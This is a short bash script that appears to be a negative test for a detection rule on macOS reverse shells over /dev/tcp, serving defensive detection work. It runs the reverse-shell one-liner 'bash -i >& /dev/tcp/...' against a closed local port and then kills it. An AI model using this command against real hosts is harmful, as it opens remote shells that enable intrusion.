#!/usr/bin/env bash
# Negative for rule be06a6b0-fa9f-4df4-9d4a-9f8794037508
#   "macOS Reverse Shell via /dev/tcp"
#
# The bash Apple ships in /bin is built without /dev/tcp, so this command line
# cannot connect and must not be treated as a working reverse shell. Closed
# local port; a background guard kills it after a couple of seconds.
set -u
/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1 # rustinel_atomic_neg' >/dev/null 2>&1 &
pid=$!
sleep 2
kill "$pid" 2>/dev/null || true
wait "$pid" 2>/dev/null || true
exit 0
